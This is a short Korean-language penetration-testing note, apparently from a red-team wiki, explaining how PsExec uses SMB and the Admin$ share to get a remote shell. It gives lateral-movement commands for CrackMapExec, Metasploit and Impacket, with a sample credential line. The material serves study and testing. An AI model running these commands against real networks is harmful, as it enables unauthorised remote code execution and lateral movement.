# SMB 와 PsExec

### SMB

SMB(Server Message Block)은 같은 네트워크내의 다른 호스트의 파일, 쉐어, 그리고 프린터를 사용하고 공유하기 위해서 마이크로소프트사에서 만든 프로토콜이다.&#x20;

원래는 파일을 공유하려고 만든 프로토콜이지만, 공격자들이 횡적이동 용도로도 쓰일 수 있다. 파일 공유 프로토콜이 어쩌다 쉘을 얻을 수 있는 프로토콜이 되었을까?&#x20;

### PsExec&#x20;

PsExec는 Mark Russinovich가 1990년대 후반에 발표한 Sysinternals 툴들 중 하나로, SMB를 이용한 원격 관리 프로그램이다. PsExec는 다음의 방식으로 다른 호스트에서 "쉘"을 얻는다.

1. 타겟 호스트의 `Admin$` 쉐어에 접근해 쉘을 시작하는 윈도우 서비스 PE 파일(`PSEXECSVC`)을 업로드한다.&#x20;
2. 타겟 호스트의 DCE/RPC를 기반으로 Windows Service Control Manager (SCM) API를 이용해 `PSEXECSVC` 서비스를 만들고, 등록한 뒤, 시작한다.&#x20;
3. `PSEXECSVC` 는 네임드 파이프를 생성한 뒤 파이프를 이용해 인풋을 받고, 호스트에서 실행한 뒤, 아웃풋으로 결과물을 반환한다.&#x20;

### 전제 조건

* 타겟 호스트의 Local Administrator 권한을 갖고 있는 계정/비밀번호&#x20;
* 타겟 호스트가 SMB 서비스를 사용하고 있으며 방화벽으로 막아놓지 않는 경우
* `File and Print Sharing` 활성화, `Simple File Sharing` 비활성화 (디폴트)

### 공격&#x20;

다양한 툴들에 있는 PsExec의 `PSEXECSVC` 서비스 PE파일은 윈도우 디펜더에 기본적으로 막히는 경우가 많다. 따라서 실무에선 SMB 횡적이동 보단 WMI나 WinRM을 더 많이 쓰는 편이다.&#x20;

{% tabs %}
{% tab title="리눅스" %}
CrackMapExec

```
# CMD
cme smb <ip> -u <user> -p <pass> -d <domain> -x <command>

# Powershell
cme smb <ip> -u <user> -p <pass> -d <domain> -X <command>
```



MetaSploit

```
use exploit/windows/smb/psexec
set rhosts <ip>
set smbuser <user>
set smbdomain <domain>
set smbpass <pass>
exploit 
```

&#x20;

Impacket - Psexec

```
impacket-psexec '<domain>/<user>:<pass>'@<ip>

# 예시 
impacket-psexec 'choi.local/Administrator:Password123!'@192.168.40.150
```
{% endtab %}
{% endtabs %}



### 레퍼런스&#x20;

{% embed url="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" %}

{% embed url="https://www.itprotoday.com/windows-server/psexec-explainer-mark-russinovich" %}

{% embed url="https://www.rapid7.com/blog/post/2013/03/09/psexec-demystified/" %}
